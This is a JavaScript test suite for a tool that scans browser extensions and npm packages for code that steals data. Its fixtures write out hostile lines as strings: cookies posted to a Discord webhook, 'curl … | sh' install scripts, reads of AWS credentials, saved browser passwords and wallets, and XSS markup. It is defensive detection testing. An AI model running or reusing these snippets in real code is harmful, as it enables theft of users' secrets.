// Pure rules first, then the archive readers, then end to end against the
// memory identity store and the fake model:
//   SNIFF_MEMORY=1 SNIFF_FAKE_AI=1 node test/run.js   (or `npm test`)
//
// The HTTP half drives the real Express app mounted under /sniff, the way
// the lab mounts it, so the auth cookie, the budget gate and the metered
// routes' parser order are exercised as deployed. Model calls are counted
// from the identity's usage rows, and what reached "the model" is read from
// the fake client's own log.
//
// Every sample here is SYNTHETIC - the built-in demo, or small fixtures
// written by hand in these tests. Nothing is a real product.

const assert = require('assert');
const fs = require('fs');
const http = require('http');
const path = require('path');
const zlib = require('zlib');
const { spawnSync } = require('child_process');
const express = require('express');

if (process.env.SNIFF_MEMORY !== '1' || process.env.SNIFF_FAKE_AI !== '1') {
  console.error('run with SNIFF_MEMORY=1 SNIFF_FAKE_AI=1');
  process.exit(1);
}

const { app, identityStore, fakeCalls } = require('../server');
const C = require('../public/sniff-core');
const D = require('../public/demo');
const ai = require('../lib/ai');

const ROOT = path.join(__dirname, '..');
const tests = [];
const test = (name, fn) => tests.push({ name, fn });

/* ---------------- helpers ---------------- */

/** Scan {path, text} entries the way the worker does: classify, read, scan. */
function scanEntries(entries, meta) {
  const files = [];
  const skipped = [];
  const counts = {};
  let total = 0;
  entries.forEach((e) => {
    const p = C.normPath(e.path);
    const c = C.classify(p, e.text.length);
    if (c.skip) { counts[c.skip] = (counts[c.skip] || 0) + 1; skipped.push({ path: p, reason: c.skip }); return; }
    const lang = c.lang || C.langOf(p, e.text.slice(0, 200));
    if (!lang) { counts.other = (counts.other || 0) + 1; skipped.push({ path: p, reason: 'other' }); return; }
    if (!e.text.trim()) { counts.empty = (counts.empty || 0) + 1; return; }
    total += e.text.length;
    files.push({ path: p, lang, text: e.text, bytes: e.text.length, size: e.text.length, cut: false });
  });
  return C.scan(files, Object.assign({ skipped, counts, bytes: total }, meta || {}));
}
function one(path, text) { return scanEntries([{ path, text }]); }
const titles = (r) => r.findings.map((f) => f.title);
const has = (r, re) => r.findings.some((f) => re.test(f.title));
const flow = (r) => r.findings.find((f) => f.cat === 'flow');

/* ---------------- the demo samples ---------------- */

test('the Weather Pal sample: the cookies->Discord flow and the install flow are both found and rank first', () => {
  const r = scanEntries(rootless(D.weather().entries), { name: 'Weather Pal', kind: 'extension' });
  assert.strictEqual(r.verdict.level, 'high', r.verdict.title);
  const flows = r.findings.filter((f) => f.cat === 'flow');
  assert.ok(flows.length >= 2, 'at least two flows: ' + flows.map((f) => f.title).join(' | '));
  assert.ok(r.findings[0].cat === 'flow' && r.findings[0].sev === 'high', 'a high flow is first');
  assert.ok(flows.some((f) => /cookies/.test(f.title) && /Discord/.test(f.title)), 'cookies -> Discord');
  assert.ok(flows.some((f) => /\.npmrc|NPM_TOKEN/.test(f.title) && /203\.0\.113\.9|raw IP/.test(f.title)), 'npm token -> raw IP');
  // the Discord webhook and the raw IP are both risky destinations
  const risky = r.destinations.filter((d) => d.tag === 'risky').map((d) => d.host);
  assert.ok(risky.includes('discord.com') && risky.includes('203.0.113.9'), risky.join(', '));
  // the benign open-meteo call is known, and low on its own
  assert.ok(r.destinations.some((d) => d.host === 'api.open-meteo.com' && d.tag === 'known'));
  assert.ok(flows.some((f) => /location/.test(f.title) && f.sev === 'low'), 'the location->weather flow is low');
  // the postinstall script is flagged, high (it reaches the network / a token)
  assert.ok(has(r, /Runs .* as soon as it is installed|postinstall/), 'the postinstall is flagged');
  // the all-pages content script and the cookies permission are high
  assert.ok(has(r, /every page you open/) && has(r, /cookies/i));
  // the no-exfil map has rows
  assert.ok(r.map.rows.length >= 2);
});

test('identical findings (same category, file, line and sentence) are one finding', () => {
  const r = scanEntries(rootless(D.weather().entries), { name: 'Weather Pal' });
  const keys = r.findings.map((f) => [f.cat, f.file, f.line, f.title].join('|'));
  assert.strictEqual(new Set(keys).size, keys.length, 'duplicates: ' + keys.filter((k, i) => keys.indexOf(k) !== i).join(' / '));
  assert.strictEqual(r.findings.filter((f) => f.cat === 'sink' && /raw IP/.test(f.title) && f.file === 'scripts/setup.js' && f.line === 9).length, 1, 'curl run by execSync is one sink finding, not two');
  // and on a one-liner that two rules both read the same way
  const one2 = one('a.js', 'require("child_process").execSync("curl --data-binary @- http://198.51.100.7/x");');
  const k2 = one2.findings.map((f) => [f.cat, f.file, f.line, f.title].join('|'));
  assert.strictEqual(new Set(k2).size, k2.length);
});

test('a flow\u2019s explanation comes from its destination\u2019s actual class, and agrees with the Destinations table', () => {
  const r = scanEntries(rootless(D.weather().entries), { name: 'Weather Pal' });
  const discord = r.findings.find((f) => f.cat === 'flow' && /Discord/.test(f.title));
  assert.ok(/webhook link/.test(discord.why), 'the risky-webhook sentence: ' + discord.why.slice(0, 80));
  assert.ok(!/known service|Known is not/.test(discord.why), 'never the known-service sentence for a risky webhook');
  const table = {}; r.destinations.forEach((d) => { table[d.host] = d; });
  r.findings.filter((f) => f.cat === 'flow' && f.dest).forEach((f) => {
    assert.strictEqual(f.dest.tag, table[f.dest.host].tag, f.dest.host + ': the flow and the table agree on its class');
    const why = C.tagHost(f.dest.host, table[f.dest.host].url, { 'weatherpal.example': 1 }).why;
    if (f.dest.tag === 'risky') assert.ok(f.why.indexOf(why) === 0, f.dest.host + ': a risky flow opens with its destination\u2019s own sentence');
    if (f.dest.tag === 'known' || f.dest.tag === 'first') assert.ok(!/webhook|bare number|tunnel/.test(f.why), f.dest.host + ': no risky sentence on a ' + f.dest.tag + ' host');
  });
  // the table takes the riskiest class a host earned: a plain discord.com link first does not hide a webhook
  const both = one('a.js', 'var a = "https://discord.com/channels/1";\nvar c = document.cookie;\nfetch("https://discord.com/api/webhooks/0/fake", {method:"POST", body:c});');
  assert.strictEqual(both.destinations.find((d) => d.host === 'discord.com').tag, 'risky');
});

test('the files summary says "6 skipped", never "skippeds"', () => {
  const js = fs.readFileSync(path.join(ROOT, 'public', 'app.js'), 'utf8');
  assert.ok(/'skipped', 'skipped'\)/.test(js));
  assert.strictEqual(C.plural(6, 'skipped', 'skipped'), '6 skipped');
});

test('the clean sample (Tidy Tabs): no high findings, nothing reaches out, still says "read it"', () => {
  const r = scanEntries(rootless(D.tidy().entries), { name: 'Tidy Tabs', kind: 'extension' });
  assert.strictEqual(r.counts.high, 0, titles(r).join(' | '));
  assert.strictEqual(r.flows, 0);
  assert.strictEqual(r.reachesOut, false);
  assert.strictEqual(r.verdict.level, 'clear');
  assert.match(r.verdict.title, /still read it/);
  // it still lists the (low/info) permissions it asks for
  assert.ok(r.permissions.length >= 1);
});
function rootless(entries) { return entries.map((e) => ({ path: e.path.replace(/^[^/]+\//, ''), text: e.text })); }

/* ---------------- sources, sinks, flows ---------------- */

test('sources: cookies, storage (all vs one), clipboard, keystrokes, env (secret vs benign), cred files, wallets', () => {
  assert.ok(has(one('a.js', 'var c = document.cookie;'), /Reads this site.s cookies/));
  assert.ok(has(one('a.js', 'send(JSON.stringify(localStorage))'), /everything.*storage/i));
  assert.ok(has(one('a.js', 'var x = localStorage.getItem("k")'), /Reads website storage/));
  assert.ok(has(one('a.js', 'navigator.clipboard.readText()'), /what you copied/));
  assert.ok(has(one('a.js', 'document.addEventListener("keydown", f)'), /every key/));
  // a secret env var is a source; a benign one (and npm lifecycle vars) is not
  assert.ok(has(one('a.js', 'var k = process.env.AWS_SECRET_ACCESS_KEY;'), /secret from the environment/));
  assert.ok(has(one('a.js', 'var k = process.env.NPM_TOKEN;'), /NPM_TOKEN/));
  assert.ok(!has(one('a.js', 'if (process.env.NODE_ENV === "production") {}'), /environment/));
  assert.ok(!has(one('a.js', 'var v = process.env.npm_package_version;'), /environment/));
  assert.ok(has(one('x.py', 'import os\nk = os.environ.get("GITHUB_TOKEN")'), /secret from the environment/));
  assert.ok(has(one('a.js', 'fs.readFileSync(os.homedir() + "/.aws/credentials")'), /AWS keys/));
  assert.ok(has(one('a.js', 'var p = "C:/Users/me/AppData/Local/Google/Chrome/User Data/Default/Login Data";'), /saved passwords/));
  assert.ok(has(one('x.py', 'p = os.path.expanduser("~/.electrum/wallets/default_wallet")'), /crypto wallet/i));
});

test('sinks and destinations are tagged: risky / first-party / known / unknown / local; a raw IP and a tunnel are risky', () => {
  assert.strictEqual(C.tagHost('discord.com', 'https://discord.com/api/webhooks/1/x').tag, 'risky');
  assert.strictEqual(C.tagHost('api.telegram.org', 'https://api.telegram.org/bot123/sendMessage').tag, 'risky');
  assert.strictEqual(C.tagHost('45.77.1.9', 'http://45.77.1.9/x').tag, 'risky');
  assert.strictEqual(C.tagHost('abc.ngrok.io', 'https://abc.ngrok.io/x').tag, 'risky');
  assert.strictEqual(C.tagHost('evil.duckdns.org', 'https://evil.duckdns.org').tag, 'risky');
  assert.strictEqual(C.tagHost('127.0.0.1', 'http://127.0.0.1:3000').tag, 'local');
  assert.strictEqual(C.tagHost('api.github.com').tag, 'known');
  assert.strictEqual(C.tagHost('api.weatherpal.app', null, { 'weatherpal.app': 1 }).tag, 'first');
  assert.strictEqual(C.tagHost('random-unheard-of.net').tag, 'unknown');
  // discord as a destination only when the path is a webhook; the chat host itself is known
  assert.strictEqual(C.tagHost('discord.com', 'https://discord.com/channels/1').tag, 'known');
  // XML namespaces and example.com are not destinations
  assert.strictEqual(C.lineDests('xmlns="http://www.w3.org/2000/svg"', 'html').length, 0);
});

test('a flow needs a source AND a sink that meet; a fetch alone is info, a fetch to the package\u2019s own API is low', () => {
  const alone = one('a.js', 'fetch("https://example.com/data").then(r=>r.json())');
  assert.ok(!alone.findings.some((f) => f.cat === 'flow'), 'no source: no flow');
  assert.ok(alone.findings.some((f) => f.rule === 'sink.fetch' && f.sev === 'info'), 'a bare fetch (no named destination) is info');
  const r = one('a.js', 'var c = document.cookie;\nfetch("https://x.evil-unknown.net/e?d=" + c);');
  const fl = flow(r);
  assert.ok(fl && /cookies/.test(fl.title), 'cookie -> unknown host is a flow');
  assert.ok(fl.sev === 'medium' || fl.sev === 'high', 'to an unknown host, at least medium: ' + fl.sev);
  // the same read sent to a well-known analytics service is softer
  const soft = one('a.js', 'var c = document.cookie;\nfetch("https://www.google-analytics.com/collect?d=" + c);');
  assert.ok(flow(soft).sev === 'low' || flow(soft).sev === 'medium');
});

test('a flow through a variable, and across lines; sensitive source + risky sink is high', () => {
  const viaVar = one('a.js', 'const stolen = document.cookie;\nconst body = "x=" + stolen;\nfetch("https://evil-unknown.net/e", {method:"POST", body: body});');
  const fl = flow(viaVar);
  assert.ok(fl, 'tracked through a variable: ' + titles(viaVar).join(' | '));
  const high = one('a.js', 'var c = document.cookie;\nfetch("https://discord.com/api/webhooks/1/t", {method:"POST", body:c});');
  assert.strictEqual(flow(high).sev, 'high', 'to a webhook: high');
});

test('install-time: npm lifecycle scripts, a URL dependency, and setup.py are flagged; a risky script bumps to high', () => {
  const pkg = JSON.stringify({ name: 'p', scripts: { postinstall: 'node x.js', test: 'jest' }, dependencies: { a: '^1.0.0', b: 'https://evil.net/b.tgz' } });
  const r = scanEntries([{ path: 'package.json', text: pkg }]);
  assert.ok(has(r, /as soon as it is installed.*postinstall/i));
  assert.ok(has(r, /outside the npm registry/));
  const risky = scanEntries([{ path: 'package.json', text: JSON.stringify({ name: 'p', scripts: { preinstall: 'curl http://x.net/i | sh' } }) }]);
  assert.strictEqual(risky.findings.find((f) => /preinstall/.test(f.title)).sev, 'high');
  const setup = one('setup.py', 'from setuptools import setup\nsetup(name="p", cmdclass={"install": X})');
  assert.ok(has(setup, /install step with its own code|cmdclass/i));
  // a source in a file that runs at install is bumped
  const install = scanEntries([{ path: 'package.json', text: JSON.stringify({ name: 'p', scripts: { postinstall: 'node setup.js' } }) }, { path: 'setup.js', text: 'var fs = require("fs");\nvar k = fs.readFileSync(os.homedir()+"/.npmrc");\nvar https = require("https");\nhttps.request("https://evil-unknown.net", {method:"POST"});' }]);
  assert.ok(install.findings.some((f) => f.cat === 'flow' && f.install && f.sev === 'high'), 'a read+send at install is high');
});

test('hiding: eval, new Function, base64 of a hidden URL, char codes, escape runs, a date gate, encoded PowerShell', () => {
  assert.ok(has(one('a.js', 'eval(x)'), /eval/i));
  assert.ok(has(one('a.js', 'new Function("return " + x)()'), /from text|Function/));
  // base64 that decodes to a URL is called out with the URL
  const url = 'https://evil-unknown.net/collect';
  const b64 = Buffer.from(url).toString('base64');
  assert.ok(has(one('a.js', 'var h = atob("' + b64 + '");'), /Hides an address|evil-unknown/));
  assert.ok(has(one('a.js', 'var s = String.fromCharCode(104,116,116,112,115,58,47,47,120);'), /character codes/i));
  assert.ok(has(one('a.js', 'var s = "\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x65\\x76\\x69\\x6c\\x2e\\x6e\\x65\\x74\\x2f\\x78\\x79\\x7a\\x31";'), /escape codes/i));
  assert.ok(has(one('a.js', 'if (Date.now() > new Date("2027-01-01")) { doit(); }'), /after a set date/i));
  assert.ok(has(one('run.ps1', 'powershell -enc ' + 'A'.repeat(40)), /encoded PowerShell/i));
  assert.ok(has(one('i.sh', 'curl http://x.net/i | sh'), /runs it straight away/i));
});

test('false positives kept honest: RegExp exec, a role= attribute, a placeholder secret, its own settings in storage', () => {
  assert.ok(!has(one('a.js', 'var m = /foo/.exec(s);'), /run other programs/i), 'RegExp#exec is not child_process');
  assert.ok(!has(one('a.js', 'var k = process.env.PORT || 3000;'), /environment/), 'PORT is benign');
  assert.ok(!has(one('a.js', 'localStorage.setItem("theme", "dark")'), /storage/i), 'writing its own setting is not a read');
  // a plain fetch to a CDN is info, not a flow
  const cdn = one('a.js', 'fetch("https://cdn.jsdelivr.net/npm/x/dist/x.js")');
  assert.ok(!cdn.findings.some((f) => f.cat === 'flow'));
  // reading its own localStorage then posting to its own first-party API, with homepage set
  const own = scanEntries([{ path: 'package.json', text: JSON.stringify({ name: 'p', homepage: 'https://myapp.example' }) }, { path: 'a.js', text: 'var v = localStorage.getItem("prefs");\nfetch("https://myapp.example/sync", {method:"POST", body: v});' }]);
  const fl = flow(own);
  assert.ok(!fl || fl.sev === 'low', 'to its own site, no more than low: ' + (fl && fl.sev));
});

test('escaping: a path, a line and a URL with hostile markup and bidi never reach the drawn title raw; invisible shows', () => {
  const nasty = 'var c = document.cookie; // <img src=x onerror=alert(1)>\u202e\nfetch("https://evil-unknown.net/\\"><svg onload=alert(1)>?d=" + c);';
  const r = one('a.js', nasty);
  const dump = JSON.stringify(r.findings) + JSON.stringify(r.destinations);
  // the raw strings exist, but esc() is what the page draws; prove esc strips them
  assert.ok(!/[<>]/.test(C.esc(dump)), 'esc removes angle brackets');
  assert.ok(!/\u202e/.test(C.esc(dump)), 'esc removes bidi');
  // a hostile path
  const pr = scanEntries([{ path: '<img src=x>/a.js', text: 'document.cookie' }]);
  assert.ok(!/[<>]/.test(C.esc(pr.findings[0].file)));
  // invisible characters in a line are made visible for the model context
  const ctx = C.contextOf('var x = "a\u202eb";', 1, 2, 0);
  assert.ok(ctx.lines.some((l) => l.includes('\u27e8U+202E\u27e9')));
});

test('bounds: file count, total bytes, per-file bytes, entry count, and what is skipped is said', () => {
  const big = [];
  for (let i = 0; i < 20; i++) big.push({ path: 'f' + i + '.js', text: 'var c = document.cookie;\n'.repeat(200) });
  const r = scanEntries(big);
  assert.ok(r.files.length <= 20 && r.findings.length >= 1);
  // skipped reasons are counted and worded
  const mix = scanEntries([{ path: 'a.png', text: 'x' }, { path: 'node_modules/b/i.js', text: 'document.cookie' }, { path: 'yarn.lock', text: 'x' }, { path: 'c.js', text: 'eval(1)' }]);
  assert.ok(mix.skippedCounts.image === 1 && mix.skippedCounts.dependencies === 1 && mix.skippedCounts.lockfile === 1);
  assert.ok(C.REASON_WORDS.dependencies && C.REASON_WORDS.lockfile);
  assert.strictEqual(mix.files.length, 1);
});

/* ---------------- archive readers ---------------- */

/** A minimal stored (uncompressed) zip from {name->text}. */
function makeZip(files) {
  const parts = [], central = [];
  let offset = 0;
  const crcTab = (function () { const t = []; for (let n = 0; n < 256; n++) { let c = n; for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1; t[n] = c >>> 0; } return t; }());
  function crc32(buf) { let c = 0xffffffff; for (let i = 0; i < buf.length; i++) c = crcTab[(c ^ buf[i]) & 0xff] ^ (c >>> 8); return (c ^ 0xffffffff) >>> 0; }
  Object.keys(files).forEach((name) => {
    const data = Buffer.from(files[name]);
    const nameB = Buffer.from(name);
    const crc = crc32(data);
    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0); local.writeUInt16LE(20, 4); local.writeUInt16LE(0, 6); local.writeUInt16LE(0, 8);
    local.writeUInt32LE(crc, 14); local.writeUInt32LE(data.length, 18); local.writeUInt32LE(data.length, 22); local.writeUInt16LE(nameB.length, 26);
    parts.push(local, nameB, data);
    const cen = Buffer.alloc(46);
    cen.writeUInt32LE(0x02014b50, 0); cen.writeUInt16LE(20, 4); cen.writeUInt16LE(20, 6); cen.writeUInt16LE(0, 10);
    cen.writeUInt32LE(crc, 16); cen.writeUInt32LE(data.length, 20); cen.writeUInt32LE(data.length, 24); cen.writeUInt16LE(nameB.length, 28); cen.writeUInt32LE(offset, 42);
    central.push(cen, nameB);
    offset += local.length + nameB.length + data.length;
  });
  const cdStart = offset;
  const cd = Buffer.concat(central);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0); eocd.writeUInt16LE(Object.keys(files).length, 8); eocd.writeUInt16LE(Object.keys(files).length, 10);
  eocd.writeUInt32LE(cd.length, 12); eocd.writeUInt32LE(cdStart, 16);
  return Buffer.concat([Buffer.concat(parts), cd, eocd]);
}
/** A minimal tar from {name->text}. */
function makeTar(files) {
  const blocks = [];
  Object.keys(files).forEach((name) => {
    const data = Buffer.from(files[name]);
    const h = Buffer.alloc(512);
    h.write(name, 0);
    h.write('0000644', 100); h.write('0000000', 108); h.write('0000000', 116);
    h.write(data.length.toString(8).padStart(11, '0'), 124);
    h.write('00000000000', 136);
    h.write('        ', 148); // checksum field as spaces
    h.write('ustar', 257); h.write('00', 263);
    h.write('0', 156);
    let sum = 0; for (let i = 0; i < 512; i++) sum += h[i];
    h.write(sum.toString(8).padStart(6, '0') + '\0 ', 148);
    blocks.push(h);
    const pad = Buffer.alloc(Math.ceil(data.length / 512) * 512);
    data.copy(pad); blocks.push(pad);
  });
  blocks.push(Buffer.alloc(1024));
  return Buffer.concat(blocks);
}
async function openBytes(buf, name) {
  const u = new Uint8Array(buf);
  const a = await C.openArchive(u, name);
  const entries = a.entries, out = [];
  for (const e of entries) { const r = await e.read(C.LIMITS.fileBytes); out.push({ path: e.path, text: C.decodeText(r.bytes) }); }
  return { kind: a.kind, files: out, skipped: a.skipped, notes: a.notes };
}

test('zip reader: central directory parsed, stored entries read; a .crx header is stripped to the zip inside', async () => {
  const zip = makeZip({ 'manifest.json': '{"manifest_version":3,"name":"X"}', 'bg.js': 'var c = document.cookie;\nfetch("https://evil-unknown.net/e", {body:c});' });
  const a = await openBytes(zip, 'ext.zip');
  assert.strictEqual(a.kind, 'zip');
  assert.deepStrictEqual(a.files.map((f) => f.path).sort(), ['bg.js', 'manifest.json']);
  assert.ok(a.files.find((f) => f.path === 'bg.js').text.includes('document.cookie'));
  // wrap it as a CRX3: "Cr24", version 3, a small fake header, then the zip
  const header = Buffer.alloc(12);
  header.write('Cr24', 0); header.writeUInt32LE(3, 4); header.writeUInt32LE(8, 8);
  const crx = Buffer.concat([header, Buffer.alloc(8), zip]);
  const b = await openBytes(crx, 'ext.crx');
  assert.strictEqual(b.kind, 'crx');
  assert.deepStrictEqual(b.files.map((f) => f.path).sort(), ['bg.js', 'manifest.json']);
});

test('tgz reader: gzip + tar, the npm "package/" root dropped, encrypted/unsupported entries said', async () => {
  const tar = makeTar({ 'package/package.json': '{"name":"p","scripts":{"postinstall":"node x.js"}}', 'package/index.js': 'require("child_process").execSync("curl http://203.0.113.5/x")' });
  const gz = zlib.gzipSync(tar);
  const a = await openBytes(gz, 'p-1.0.0.tgz');
  assert.strictEqual(a.kind, 'tgz');
  assert.ok(a.files.some((f) => /package\.json$/.test(f.path)));
  const r = scanEntries(a.files.map((f) => ({ path: f.path.replace(/^package\//, ''), text: f.text })));
  assert.ok(has(r, /postinstall/i) && r.destinations.some((d) => d.host === '203.0.113.5'));
});

test('a single gzipped file and a plain tar both read; junk bytes are a clean rejection', async () => {
  const gz = zlib.gzipSync(Buffer.from('var c = document.cookie;'));
  const a = await openBytes(gz, 'a.js.gz');
  assert.ok(a.kind === 'gz' && a.files[0].text.includes('document.cookie'));
  const tar = makeTar({ 'a.js': 'eval(1)' });
  const b = await openBytes(tar, 'a.tar');
  assert.ok(b.kind === 'tar' && b.files[0].path === 'a.js');
  await assert.rejects(() => C.openArchive(new Uint8Array([1, 2, 3, 4, 5]), 'x.bin').then((x) => { if (!x) throw new Error('not an archive'); }), /not an archive|could not be read/);
});

/* ---------------- the model payloads ---------------- */

test('explainPayload sends the lines around ONE finding (both ends of a flow), bounded; nothing else', () => {
  const r = scanEntries(rootless(D.weather().entries), { name: 'Weather Pal' });
  const texts = {};
  rootless(D.weather().entries).forEach((e) => { texts[C.normPath(e.path)] = e.text; });
  const f = r.findings.find((x) => x.cat === 'flow' && /Discord/.test(x.title));
  const p = C.explainPayload(f, (path) => (Object.prototype.hasOwnProperty.call(texts, path) ? texts[path] : null));
  assert.ok(p.snippets.length >= 1 && p.snippets.length <= 4);
  assert.deepStrictEqual(Object.keys(p).sort(), ['finding', 'snippets']);
  const s = JSON.stringify(p);
  assert.ok(s.length <= C.LIMITS.explainChars + 2000);
  // it carries the sink file's lines, not every file
  assert.ok(p.snippets.some((x) => x.file === 'background.js'));
  assert.ok(!p.snippets.some((x) => x.file === 'popup/forecast.js'), 'unrelated files are not sent');
});

test('reviewPayload is the scan\u2019s shape plus bounded snippets, never whole files', () => {
  const r = scanEntries(rootless(D.weather().entries), { name: 'Weather Pal' });
  const texts = {};
  rootless(D.weather().entries).forEach((e) => { texts[C.normPath(e.path)] = e.text; });
  const p = C.reviewPayload(r, (path) => (texts[path] === undefined ? null : texts[path]));
  assert.ok(p.summary && Array.isArray(p.summary.findings) && Array.isArray(p.summary.destinations));
  assert.ok(p.snippets.length <= C.LIMITS.reviewSnippets);
  assert.ok(JSON.stringify(p).length <= C.LIMITS.reviewChars + 8000);
});

test('cleanOpinion bounds every field, strips markup/bidi, drops a bad verdict/confidence; nothing usable is null', () => {
  const ex = C.cleanOpinion({ verdict: 'likely-malicious', why: '<b>bad</b>\u202e' + 'x'.repeat(2000), whatToCheck: ['<script>x</script>c', 42, ...Array(20).fill('c')], confidence: 'nope' });
  assert.ok(ex.why.length <= 900 && !/[<>\u202e]/.test(JSON.stringify(ex)));
  assert.strictEqual(ex.confidence, 'low');
  assert.ok(ex.whatToCheck.length <= 6);
  assert.strictEqual(C.cleanOpinion({ verdict: 'nope', why: 'x' }), null);
  assert.strictEqual(C.cleanOpinion({ verdict: 'likely-benign', why: '' }), null);
  assert.strictEqual(C.cleanOpinion('x'), null);
});

test('ai.cleanExplain / cleanReview rebuild the request field by field and drop anything extra', () => {
  const good = { finding: { category: 'flow', severity: 'high', title: 'x', file: 'a.js', line: 3 }, snippets: [{ file: 'a.js', start: 1, lines: ['1: a', '2: b'] }], extra: 'DROP_ME', system: 'OVERRIDE' };
  const c = ai.cleanExplain(good);
  assert.ok(c && !('extra' in c) && !('system' in c));
  assert.strictEqual(ai.cleanExplain({ finding: { title: 'x' }, snippets: [] }), null);
  assert.strictEqual(ai.cleanExplain({ snippets: [{ file: 'a', start: 1, lines: ['x'] }] }), null);
  const rv = ai.cleanReview({ summary: { kind: 'extension', findings: [{ category: 'sink', severity: 'low', title: 't' }] }, snippets: [], junk: 1 });
  assert.ok(rv && !('junk' in rv));
  assert.strictEqual(ai.cleanReview({}), null);
});

/* ---------------- the page ---------------- */

function luminance(hex) {
  const n = hex.replace('#', '');
  return [0, 2, 4].map((i) => parseInt(n.slice(i, i + 2), 16) / 255).map((c) => (c <= 0.03928 ? c / 12.92 : ((c + 0.055) / 1.055) ** 2.4)).reduce((s, c, i) => s + c * [0.2126, 0.7152, 0.0722][i], 0);
}
const ratio = (a, b) => { const [x, y] = [luminance(a), luminance(b)].sort((p, q) => q - p); return (x + 0.05) / (y + 0.05); };

test('every text colour holds 4.5:1 on its surface in both themes; tap targets 44px; no horizontal scroll', () => {
  const css = fs.readFileSync(path.join(ROOT, 'public', 'app.css'), 'utf8');
  const block = (re) => { const m = re.exec(css); assert.ok(m, String(re)); const out = {}; for (const [, k, v] of m[1].matchAll(/--([a-z0-9-]+):\s*(#[0-9a-f]{6})/gi)) out[k] = v; return out; };
  const light = block(/^:root \{([\s\S]*?)\n\}/m);
  const dark = block(/:root:not\(\[data-theme="light"\]\) \{([\s\S]*?)\n {2}\}/);
  const forced = block(/:root\[data-theme="dark"\] \{([\s\S]*?)\n\}/);
  assert.deepStrictEqual(forced, dark, 'the forced dark theme matches the automatic one');
  for (const [name, t] of [['light', light], ['dark', dark]]) {
    for (const bg of ['bg', 'card', 'card2', 'code-bg']) for (const fg of ['text', 'muted', 'link']) assert.ok(ratio(t[fg], t[bg]) >= 4.5, `${name} ${fg} on ${bg}: ${ratio(t[fg], t[bg]).toFixed(2)}`);
    assert.ok(ratio(t['accent-ink'], t.accent) >= 4.5, `${name} accent-ink on accent`);
    for (const k of ['high', 'med', 'low', 'info', 'skim']) {
      assert.ok(ratio(t[k], t[k + '-bg']) >= 4.5, `${name} ${k} pill: ${ratio(t[k], t[k + '-bg']).toFixed(2)}`);
      assert.ok(ratio(t.text, t[k + '-bg']) >= 4.5, `${name} text on ${k}-bg`);
    }
    assert.ok(ratio(t.high, t.card) >= 4.5 && ratio(t.high, t.bg) >= 4.5, `${name} an error message`);
    assert.ok(ratio(t.text, t['accent-soft']) >= 4.5 && ratio(t.accent, t['accent-soft']) >= 4.5, `${name} the privacy line`);
    assert.ok(ratio(t['strip-ink'], t.strip) >= 4.5 && ratio(t['strip-muted'], t.strip) >= 4.5, `${name} the strip`);
    assert.ok(ratio(t.bg, t.text) >= 4.5, `${name} toast (inverted)`);
  }
  // the hero gradient ends and its text
  for (const [fg, bg] of [['#f2effc', '#1b1338'], ['#f2effc', '#7a1f66'], ['#e4def5', '#342063'], ['#ffb0d8', '#1b1338'], ['#ffb0d8', '#342063'], ['#221600', '#ffd166']]) assert.ok(ratio(fg, bg) >= 4.5, `hero ${fg} on ${bg}: ${ratio(fg, bg).toFixed(2)}`);
  assert.ok(/\.btn \{[^}]*min-height: 44px/.test(css) && /\.tick \{[^}]*min-width: 44px/.test(css) && /\.link-btn \{[^}]*min-height: 44px/.test(css), '44px tap targets');
  assert.ok(/body \{[^}]*overflow-x: hidden/.test(css));
  assert.ok(/\.snippet \{[^}]*overflow-x: auto/.test(css) && /\.dests-wrap \{[^}]*overflow-x: auto/.test(css), 'code and the wide table scroll in their own box');
  assert.ok(/@media \(max-width: 640px\) \{ \.dests-wrap \{ display: none; \} \.dest-cards \{ display: grid; \} \}/.test(css), 'below 640px the destinations are stacked cards, not table columns');
  assert.ok(/\.ftitle \{[^}]*font-weight: 700/.test(css) && !/\.ftitle \{[^}]*monospace/.test(css), 'finding titles are the sans body font');
});

test('the page: relative links, no inline script or handlers, storage wrapped, only known requests, nothing after a response', () => {
  const html = fs.readFileSync(path.join(ROOT, 'public', 'index.html'), 'utf8');
  assert.ok(!/<script(?![^>]*\bsrc=)[^>]*>/i.test(html), 'no inline <script>');
  assert.ok(!/\son[a-z]+\s*=/i.test(html), 'no inline handlers');
  assert.ok(html.includes('<script src="verify-banner.js" data-mount="api/auth" defer></script>'));
  assert.ok(html.includes('<link rel="stylesheet" href="desktop.css">') && html.includes('<script src="passkey-client.js"></script>'));
  assert.ok(!/(src|href)="\//.test(html), 'relative asset links only');
  const js = fs.readFileSync(path.join(ROOT, 'public', 'app.js'), 'utf8');
  assert.ok(!/\son[a-z]+=\\?["']/.test(js), 'no handler written into markup');
  assert.ok(!/\.on(click|submit|change|input) =/.test(js), 'DOM handlers by addEventListener (worker.onmessage/onerror are the Worker API)');
  assert.ok(/localStorage\.getItem[^\n]*\} catch/.test(js) && /localStorage\.setItem[^\n]*\} catch/.test(js) && /localStorage\.removeItem[^\n]*\} catch/.test(js), 'every storage access is wrapped');
  assert.ok(!/sessionStorage|indexedDB/.test(js));
  assert.ok(!/fetch\(['"]\//.test(js), 'every browser URL is relative to BASE');
  const calls = [...js.matchAll(/api\('(GET|POST)', '([^']+)'/g)].map((m) => m[2]);
  assert.deepStrictEqual([...new Set(calls)].sort(), ['api/auth/', 'api/auth/billing', 'api/auth/logout', 'api/explain', 'api/me', 'api/review'].sort(), 'the page asks for nothing else - no route takes code');
  assert.ok(/data-act="explain"/.test(js) && /id="exOk"/.test(js) && /send\.disabled = !ok\.checked/.test(js), 'a confirmation box before sending');
  assert.ok(!/[a-z0-9._-]+@[a-z0-9-]+\.[a-z]{2,}/i.test(html + js.replace(/example|weatherpal|myapp/g, '')), 'no email address in the page');
  // The core and the worker make no real network or storage calls. (demo.js
  // is sample *data* - its strings deliberately contain fetch/cookie/etc.)
  for (const f of ['public/sniff-core.js', 'public/scan-worker.js']) assert.ok(!/\bfetch\(|new XMLHttpRequest|\blocalStorage\.|\bsessionStorage\.|navigator\.sendBeacon/.test(fs.readFileSync(path.join(ROOT, f), 'utf8')), `${f} touches no network or storage`);
  assert.ok(!/require\(|XMLHttpRequest|\bfetch\s*\(\s*[a-z]/.test(fs.readFileSync(path.join(ROOT, 'public/demo.js'), 'utf8').replace(/'[^']*'|"[^"]*"|`[^`]*`/g, '')), 'demo.js is pure data outside its string fixtures');
  const server = fs.readFileSync(path.join(ROOT, 'server.js'), 'utf8');
